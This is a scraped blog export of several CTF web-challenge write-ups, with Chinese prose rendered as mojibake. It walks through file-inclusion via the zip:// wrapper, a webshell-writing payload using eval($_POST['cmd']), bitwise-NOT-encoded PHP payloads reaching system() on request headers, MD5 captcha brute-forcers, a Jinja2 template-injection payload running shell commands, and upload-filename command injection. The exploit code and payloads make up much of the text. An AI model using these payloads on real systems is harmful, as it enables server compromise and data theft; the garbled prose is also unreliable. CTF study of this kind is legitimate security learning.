12345678910111213141516&lt;?php if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123; $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;]; $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;]; if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123; $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;); if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123; $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;; &#125; &#125; &#125; ?&gt; ä¸Šä¼ ä¹‹åæˆ‘ä»¬å†å»index.phpåŒ…å«ä¸å°±å¥½äº†å—ï¼ã€‚æƒ³åˆ°è¿™é‡Œæˆ‘ä»¬é©¬ä¸Šæ“ä½œ.ç»“æœçªç„¶æƒ³åˆ°åœ¨æ–‡ä»¶çš„æœ€åä¼šè¢«åŠ ä¸Šphpåç¼€å,è¿™å°±æ²¡åŠæ³•ç›´æ¥è¯»å–äº†,åªèƒ½é€šè¿‡zipåè®® ä¼ªåè®®: file://ã€php://filterã€php://inputã€zip://ã€compress.bzip2://ã€compress.zlib://ã€data:// 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;148886.html é¢˜å¤–è¯: 12345http://127.0.0.1/cmd.php?file=php://input[POST DATA] &lt;?php phpinfo()?&gt;ä¹Ÿå¯ä»¥POSTå¦‚ä¸‹å†…å®¹ç”Ÿæˆä¸€å¥è¯ï¼š &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;&#x27;);?&gt; é‚£ä¹ˆè¿™æ ·å°±ç®€å•äº†ï¼Œå†™ä¸€ä¸ªshell.phpï¼Œç„¶åå‹ç¼©ï¼Œå†æ”¹åç¼€ä¸ºjpgå³å¯, payloadï¼š 1http:&#x2F;&#x2F;0dad2d9e-f7fb-4cb0-905a-9860648d77ec.node3.buuoj.cn&#x2F;?page&#x3D;zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;upload&#x2F;d03ea7c190280b2369947674c89fb32c6e98f591.jpg%23shell Roamphp4-Rcemeæ–‡ä»¶æ³„éœ²..swpçš„æ–‡ä»¶æ³„éœ²æ˜¯é€šè¿‡ .filename.swpçš„ï¼Œæ¯”å¦‚ï¼š 12index.php.index.php.swp è„±ä¸‹æ¥ä¹‹åå¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435/************************************ author : Longlone* type : Backup***********************************/&lt;?phperror_reporting(0);session_start();if(!isset($_SESSION[&#x27;code&#x27;]))&#123; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5);&#125;if(isset($_POST[&#x27;cmd&#x27;]) and isset($_POST[&#x27;code&#x27;]))&#123; if(substr(md5($_POST[&#x27;code&#x27;]),0,5) !== $_SESSION[&#x27;code&#x27;])&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Captcha error~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST[&#x27;cmd&#x27;]; if(strlen($code) &gt; 70 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm&#x27;,$code))&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Longlone not like you~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123; @eval($code); die(); &#125;&#125;?&gt; codeæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´æ¥å¾—åˆ°ï¼š 1234567891011&lt;?php$a = 0;while (true) &#123; if (substr(md5($a), 0, 5) == &quot;f815a&quot;) &#123; die($a.&quot;\\n&quot;); &#125; else &#123; $a++; &#125;&#125; å…­ä½æ•°ä»¥ä¸‹éƒ½å¯ä»¥çˆ†ç ´..è¶…è¿‡å…­ä½æ•°çš„è¯ä¼šå¾ˆéš¾å‡º è¿™é‡Œå†è´´ä¸Šä¸€ä¸ªåˆ«çš„å¸ˆå‚…çš„pythonçš„ï¼š 12345678910111213141516171819202122232425262728293031323334import hashlibfrom multiprocessing.dummy import Pool as ThreadPool# MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®# ä¾‹å­ substr(md5(captcha), 0, 6)=60b7efdef md5(s): # è®¡ç®—MD5å­—ç¬¦ä¸² return hashlib.md5(str(s).encode(&#x27;utf-8&#x27;)).hexdigest()keymd5 = &#x27;2e2f0&#x27; # å·²çŸ¥çš„md5æˆªæ–­å€¼md5start = 0 # è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®md5length = 5def findmd5(sss): # è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯• key = sss.split(&#x27;:&#x27;) start = int(key[0]) # å¼€å§‹ä½ç½® end = int(key[1]) # ç»“æŸä½ç½® result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:5] == keymd5: # æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸² result = i print(result) # æ‰“å° breaklist=[] # å‚æ•°åˆ—è¡¨for i in range(10): # å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾ list.append(str(10000000*i) + &#x27;:&#x27; + str(10000000*(i+1)))pool = ThreadPool() # å¤šçº¿ç¨‹ä»»åŠ¡pool.map(findmd5, list) # å‡½æ•°ä¸å‚æ•°åˆ—è¡¨pool.close()pool.join() ï¼ˆé¡ºä¾¿phpçš„æ€§èƒ½è·‘å¾—æ¯”pythonå¿«å¾ˆå¤šå•Š å¼‚æˆ–è¿™é¢˜æŒ£ä¸å‡ºæ¥ï¼Œæ€è·¯ä¸æ˜¯è¿™ä¸ªï¼Œä½†æ˜¯ä¾ç„¶è´´ä¸ªå¼‚æˆ–è„šæœ¬è¿‡æ¥ï¼š 1234567891011121314151617181920&lt;?phphighlight_file(__file__);$a = &#x27;~!@#$%^&amp;*()_+\\|/?.,&lt;&gt;`-=&#123;&#125;[]&#x27;;for($i = 0;$i&lt;strlen($a);$i++)&#123; for($j = 0;$j&lt;strlen($a);$j++)&#123; if (ord($a[$i]^$a[$j])&gt;64 &amp;&amp; ord($a[$i]^$a[$j])&lt;91)&#123; echo $a[$i]. &#x27; xor &#x27; .$a[$j]. &#x27; is &#x27;; echo chr(ord($a[$i]^$a[$j])). &#x27; &#x27;; echo ord($a[$i]^$a[$j]); echo &quot;\\n&lt;br&gt;&quot;; &#125;elseif (ord($a[$i]^$a[$j])&gt;96 &amp;&amp; ord($a[$i]^$a[$j])&lt;122)&#123; echo $a[$i]. &#x27; xor &#x27; .$a[$j]. &#x27; is &#x27;; echo chr(ord($a[$i]^$a[$j])). &#x27; &#x27;; echo &#x27; &#x27; .ord($a[$i]^$a[$j]); echo &quot;\\n&quot;; &#125; &#125;&#125;?&gt; 12345678910111213141516vaild = &quot;!@&amp;%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;?-=_`~&quot;answer =&quot;phpinfo&quot;tmp,tmp2 = &#x27;&#x27;,&#x27;&#x27;for c in answer: for i in vaild: for j in vaild: if ord(i)^ord(j) ==ord(c): tmp+=j tmp+=i break else: continue breakprint(tmp,tmp2) å›åˆ°é¢˜ç›®ï¼Œè¿™é‡Œéœ€è¦ä¸€ä¸ªtrickï¼Œå–åçš„æ—¶å€™å…¶å®å¯ä»¥ç”¨ 1[~å–åå€¼][!%FF] è¿™æ ·æ¥æ„é€ ..æˆ‘ä»¬å…ˆè¯•è¯•çœ‹æ‰§è¡Œphpinfo(); 1cmd=[~%8F%97%8F%96%91%99%90][!%FF]();&amp;code=653808 å‘ç°æˆåŠŸæ‰§è¡Œã€‚ã€é¡ºä¾¿è¸©å‘ï¼Œä¸èƒ½ç”¨postmanå»åšï¼Œè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¥½ä¹… = = å§æ§½ å†ä¹‹åå°è¯•é…åˆç€æ‰“æ— å‚æ•°RCE è†œç‹å¹ä¹‹å¸ˆå‚…ã€ 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12311239.html æ”¶é›†çŸ¥è¯†ï¼š 12current(localeconv());pos(localeconv()) å°±æ˜¯ä¸¤ä¸ªç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸¤ä¸ªæ‰«ç›®å½•ï¼š 1print_r(scandir(current(localeconv()))) å–åä¸€æ³¢ï¼š 12345678910111213141516&lt;?php//$a = &quot;%8C%86%8C%8B%9A%92&quot;;//echo (~urldecode($a));$b = &quot;localeconv&quot;;echo urlencode((~$b));//print_r(scandir(pos(localeconv())))//var_dump =%89%9E%8D%A0%9B%8A%92%8F//getallheaders =%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());//phpinfo [~%8F%97%8F%96%91%99%90][!%FF]();//print_r %8F%8D%96%91%8B%A0%8D//scandir %8C%9C%9E%91%9B%96%8D//current %9C%8A%8D%8D%9A%91%8B//pos %8F%90%8C//localeconv %93%90%9C%9E%93%9A%9C%90%91%89//æ‹¼èµ·æ¥ï¼š[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]()))); å¾—å‡ºï¼š 1cmd=[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));&amp;code=217941 ç»“æœflagä¸åœ¨è¿™é‡Œï¼Œwdnmdã€‚å¦‚æœä¸€ç›´è·Ÿåˆ°æ ¹ç›®å½•çš„è¯å®åœ¨å¤ªæ¶å¿ƒå¤ªé•¿äº†ã€‚ è½¬æ¢ä¸€ä¸‹æ€è·¯å¥½äº†ï¼š 1system(hex2bin(session_id(session_start())); ç°åœ¨å¯ä»¥äº† 1[~%8C%86%8C%8B%9A%92][!%FF]([~%97%9A%87%CD%9D%96%91][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()))); ä½†æ˜¯åœ¨è¿™ç§æ€è·¯ä¸‹çš„è¯ï¼Œå› ä¸ºæ‹¥æœ‰ç©ºæ ¼ï¼Œå°±ä¼šå¯¼è‡´æ¯æ¬¡çš„éªŒè¯ç éƒ½ä¸åœçš„åœ¨å˜å°±å¾ˆçƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¯æ¬¡éƒ½ä¼šé­é‡éªŒè¯ç é”™è¯¯ã€‚ã€‚æ²¡åŠæ³•ç”¨ç©ºæ ¼çš„è¯å†ç”¨${IFS}$9è¯•è¯•çœ‹ ç»“æœä¾ç„¶å‡ºä¸æ¥ã€‚ã€‚å¾ˆçƒ¦ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒMDï¼Œã€‚å¤§æ¦‚æ˜¯cookiesä¸å…è®¸ï¼Œæƒ³äº†æƒ³æ•´ä¸ªåˆ«çš„æ´» 1eval(session_id(session_start())); 1[~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]())); ç»“æœæƒ³æ³•ä¾ç„¶æ²¡åŠæ³•æˆåŠŸï¼Œcookiesåªè¦æºå¸¦ç‰¹æ®Šç¬¦å·å°±ä¼šéªŒè¯ç ä¸é€šè¿‡ï¼Œè¿™ä¸‹å°±æ¶å¿ƒåˆ°æˆ‘äº†ã€‚ ç¿»å‡ºåˆ«äººçš„æ€»ç»“: 123456789101112131415161718getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼pos() current() çš„åˆ«ånext() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚end() å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚array_flip() array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²getenv() è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°) é‚£ä¹ˆæˆ‘ä»¬æ¥æ„å»º 1system(current(getallheaders())); 1234567891011121314//system %8C%86%8C%8B%9A%92//session_id %8C%9A%8C%8C%96%90%91%A0%96%9B//session_start %8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B// %9A%89%9E%93//æ‹¼å‡ºæ¥ [~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()));// system(pos(getallheaders()))//var_dump %89%9E%8D%A0%9B%8A%92%8F//system %8C%86%8C%8B%9A%92//pos %8F%90%8C//getallheaders %98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C//æ‹¼å‡ºæ¥ [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));//var_dump(pos(getallheaders()))//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); å‘ç°é¦–ä½ä¸å¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å†nextä¸€ä¸‹ æœ€åæ‹¼æ¥å‡ºæ¥ 1system(next(getallheaders())); 1cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&amp;code=351355","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"NCTF2018_eating_cms","slug":"NCTF2018-eating-cms","date":"2021-04-26T13:19:17.000Z","updated":"2021-04-26T13:43:04.283Z","comments":true,"path":"2021/04/26/NCTF2018-eating-cms/","link":"","permalink":"http://example.com/2021/04/26/NCTF2018-eating-cms/","excerpt":"","text":"çŸ¥è¯†ç‚¹ï¼šè¿™é¢˜å­¦åˆ°çš„ä¸œè¥¿æ˜¯ï¼š å½“å‘½ä»¤æ‰§è¡Œ../è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ç”¨cd ..;ls ..çš„æ–¹å¼é€æ­¥å‘ä¸Šæ“ä½œã€‚ åšé¢˜æ€è·¯ï¼šå¼€å±€æœ‰ä¸ªlogin,ç™»é™†çš„æ—¶å€™ æ‰€ä»¥çŒœæµ‹ä»–æœ‰æ³¨å†Œé¡µé¢ï¼Œæ³¨å†Œä¸€ä¸‹å°±è¿›å»äº†ï¼Œè¿›å»ä¹‹åå°±å‘ç°ï¼š å°è¯•ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæ‰¾åˆ°function.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; è¯•ç€è¯»å–ffffllllaaaagggï¼Œä½†æ˜¯ä»–å·²ç»è¿‡æ»¤äº†ï¼Œä½†æ˜¯parse_urlæœ‰é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ï¼š 1//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg è¯»è¿‡å»å‘ç°m4aaannngggeeeï¼Œå†ä¹‹åå¯ä»¥å‘ç°templates/upload.htmlï¼Œä¸Šä¼ ä¸€äº›å°±èƒ½å‘ç°æ˜¯ä¸ªå‡çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çŸ¥é“æœ‰upllloadddd.phpï¼Œä¼°æ‘¸ç€å°±æ˜¯æ²¡åœ¨templatesè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼ˆè¯´å®è¯æˆ‘ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆæ„ä¹‰- -ï¼Ÿï¼‰ å›åˆ°user.phpè¯»å–uploadçš„ä»£ç  12345678910111213141516171819202122232425&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload fileé”›ï¿½&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125; å‘ç°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œäºæ˜¯éšä¾¿ä¸Šä¼ ä¸ªä¸œè¥¿è¿‡å»æ”¹æ–‡ä»¶åå°±å¯ä»¥ï¼š å‘ç°ä¸èƒ½ç”¨../å»è¯»å–ï¼Œæ‰€ä»¥ç”¨ä¹‹å‰æåˆ°çš„çŸ¥è¯†ç‚¹å°±å¥½ è¯»å–flagå¾—åˆ°","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"Double_Secret","slug":"Double-Secret","date":"2021-04-22T07:43:02.000Z","updated":"2021-04-22T08:07:48.743Z","comments":true,"path":"2021/04/22/Double-Secret/","link":"","permalink":"http://example.com/2021/04/22/Double-Secret/","excerpt":"","text":"Double_Secretæ— è¯­ï¼Œè„‘æ´é¢˜ç›®ï¼Œéœ€è¦å‡ ä¸‹çš„å°±æ˜¯rc4çš„åŠ å¯†è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738import base64from urllib import parsedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):#è¿”å›åŠ å¯†åå¾—å†…å®¹ s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))key = &quot;HereIsTreasure&quot; #æ­¤å¤„ä¸ºå¯†æ–‡message = input(&quot;è¯·è¾“å…¥æ˜æ–‡:\\n&quot;)enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),&#x27;utf-8&#x27;)enc_url = parse.quote(enc_init)print(&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;+enc_url)#print(&quot;rc4åŠ å¯†åçš„base64ç¼–ç &quot;+enc_base64)æ”¾å‡ºï¼š&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[]},{"title":"encode_and_encode","slug":"encode-and-encode","date":"2021-04-21T09:54:02.000Z","updated":"2021-04-21T09:56:01.110Z","comments":true,"path":"2021/04/21/encode-and-encode/","link":"","permalink":"http://example.com/2021/04/21/encode-and-encode/","excerpt":"","text":"é¢˜ç›®æ€è·¯ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page);// echo $content; if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); ç»•è¿‡æ€è·¯ï¼š â€‹ å¯ä»¥åˆ©ç”¨\\u æ¥ç»•è¿‡å­—ç¬¦ä¸²é™åˆ¶ï¼Œåˆ©ç”¨ä¼ªåè®®æµè¯»å–æ–‡ä»¶æ•°æ®","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"JSON","slug":"JSON","permalink":"http://example.com/tags/JSON/"}]},{"title":"è™ç¬¦2021_InternalSystem","slug":"è™ç¬¦2021-InternalSystem","date":"2021-04-05T04:04:15.000Z","updated":"2021-04-05T06:50:31.735Z","comments":true,"path":"2021/04/05/è™ç¬¦2021-InternalSystem/","link":"","permalink":"http://example.com/2021/04/05/%E8%99%8E%E7%AC%A62021-InternalSystem/","excerpt":"","text":"æ¯”èµ›çš„æ—¶å€™å®Œå…¨æ²¡æƒ³åˆ°å†…ç½‘é“¾æ¥..ç™»é™†ä¸Šå»ä¹‹åå°±å¡ä½äº†ï¼Œçœ‹äº†èµµæ€»çš„åšå®¢æ‰æ‡‚ï¼Œèµµæ€»tql! 1https:&#x2F;&#x2F;www.zhaoj.in&#x2F;read-6905.html è¿™é“é¢˜ç›®æ¶‰åŠçš„è€ƒç‚¹å¦‚ä¸‹ï¼š NodeJS å¼±ç±»å‹æ¯”è¾ƒ NodeJSä»£ç å®¡è®¡ SSRF NodeJS8çš„æ¼æ´ åœ¨/sourceä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æºç ï¼š 